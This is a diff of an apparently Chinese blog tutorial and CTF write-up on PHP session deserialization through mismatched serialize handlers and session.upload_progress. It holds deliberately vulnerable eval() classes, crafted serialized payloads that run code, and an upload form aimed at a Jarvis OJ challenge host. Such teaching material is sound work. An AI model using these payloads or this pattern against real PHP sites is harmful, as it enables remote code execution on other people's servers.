+<p>例子如下，有两个页面：</p>
+<pre><code class="php">//test1.php
+&lt;?php
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+session_start();
+
+class A {
+    public $test;
+    function __construct()
+    {
+         eval($this-&gt;test);
+    }
+}
+</code></pre>
+<pre><code class="php">//test2.php
+&lt;?php
+ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
+session_start();
+$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];
+?&gt;
+</code></pre>
 <p>可以看到这两个页面分别用了不同的处理器来处理Session，我们就可以利用<code>php_serialize</code>和<code>php</code>的差异来进行构造。</p>
-<p>我们先进行构造，脚本如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$a-&gt;test = <span class="string">'phpinfo();'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//output: O:1:"A":1:&#123;s:4:"test";s:10:"phpinfo();";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>我们先进行构造，脚本如下：</p>
+<pre><code class="php">&lt;?php
+class A {
+    public $test;
+    function __construct()
+    {
+         eval($this-&gt;test);
+    }
+}
+$a = new A();
+$a-&gt;test = &#39;phpinfo();&#39;;
+echo serialize($a);
+//output: O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;}
+?&gt;
+</code></pre>
 <p>首先，我们访问<code>test2.php</code>，我们在上述payload前加上<code>|</code>，并传入<code>?name=|O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;}</code>。</p>
 <p>这样由<code>php_serialize</code>处理器序列化存入的session实际上为：</p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">a:</span><span class="number">1</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">"name"</span></span>;<span class="symbol">s:</span><span class="number">42</span><span class="symbol">:<span class="string">"|O:1:"</span>A<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:10:"</span>phpinfo</span>();<span class="string">";&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure>
-<p>但是在<code>test1.php</code>中是使用的<code>php</code>处理器，由它们的区别我们可以知道：在被<code>php</code>处理器反序列化的时候，会以<code>|</code>来分割为键值对。</p>
+<pre><code>a:1:{s:4:&quot;name&quot;;s:42:&quot;|O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;}&quot;;}
+</code></pre><p>但是在<code>test1.php</code>中是使用的<code>php</code>处理器，由它们的区别我们可以知道：在被<code>php</code>处理器反序列化的时候，会以<code>|</code>来分割为键值对。</p>
 <p>这样当带着上面上述Session去访问<code>test1.php</code>时，<code>|</code>后面的值，也就是我们构造的序列化字符串就会被成功的反序列化并执行了。</p>
 <h6 id="（2）CTF实例"><a href="#（2）CTF实例" class="headerlink" title="（2）CTF实例"></a>（2）CTF实例</h6><p>题目连接：<a href="http://web.jarvisoj.com:32784" target="_blank" rel="noopener">http://web.jarvisoj.com:32784</a></p>
 <p>给了源码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+//A webshell is wait for you
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = &#39;phpinfo();&#39;;
+    }
+
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+if(isset($_GET[&#39;phpinfo&#39;]))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents(&#39;index.php&#39;));
+}
+?&gt;
+</code></pre>
 <p>可以看到这里用了<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>，那么我们只要传入构造好的session，就可以进行反序列化攻击了。</p>
 <p>根据题目，先看一下<code>phpinfo()</code>的信息，发现<code>session.upload_progress.enabled</code>是on的，而session.upload_progress.cleanup所以可以通过上传文件，从而在session文件中写入数据。</p>
 <h6 id="（3）关于session-upload-progress（php-gt-5-4）"><a href="#（3）关于session-upload-progress（php-gt-5-4）" class="headerlink" title="（3）关于session.upload_progress（php&gt;=5.4）"></a>（3）关于session.upload_progress（php&gt;=5.4）</h6><p>在php.ini有以下几个默认选项：</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.enabled</span> = on</span><br><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.cleanup</span> = on</span><br><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.prefix</span> = <span class="string">"upload_progress_"</span></span><br><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.name</span> = <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span></span><br></pre></td></tr></table></figure>
-<ul>
+<pre><code>session.upload_progress.enabled = on
+session.upload_progress.cleanup = on
+session.upload_progress.prefix = &quot;upload_progress_&quot;
+session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;
+</code></pre><ul>
 <li><p>enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)<strong>存储在session当中</strong> ；</p>
 </li>
 <li><p>cleanup=on表示当文件上传结束后，php将会<strong>立即清空</strong>对应session文件中的内容，这个选项<strong>非常重要</strong>；</p>
@@ -433,8 +872,28 @@
 </li>
 </ul>
 <p>关于这方面的利用，可以参考：<a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a></p>
-<p>所以这里我们先构造表单，这里的action只要是服务器上代码中有session_start()的php文件即可:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后利用如下脚本生成序列化字符串（这里system等系统函数好像使用不了，可能权限不够）：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">"print_r(scandir(dirname(__FILE__)));"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">// Output: O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>所以这里我们先构造表单，这里的action只要是服务器上代码中有session_start()的php文件即可:</p>
+<pre><code class="html">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;        
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;        
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;        
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+<p>然后利用如下脚本生成序列化字符串（这里system等系统函数好像使用不了，可能权限不够）：</p>
+<pre><code class="php">&lt;?php
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = &quot;print_r(scandir(dirname(__FILE__)));&quot;;
+    }
+}
+$a = new OowoO();
+echo serialize($a);
+// Output: O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}
+?&gt;
+</code></pre>
 <p>利用写好的表单随意上传文件，然后抓包，修改文件内容，因为我提交的是index页面所以直接看到结果：</p>
 <p><img src="/2019/08/06/谈一谈PHP反序列化/20190807042442277.png" alt="在这里插入图片描述"></p>
 <p>知道了flag的文件名，之后修改payload脚本的就可以代码执行了。</p>
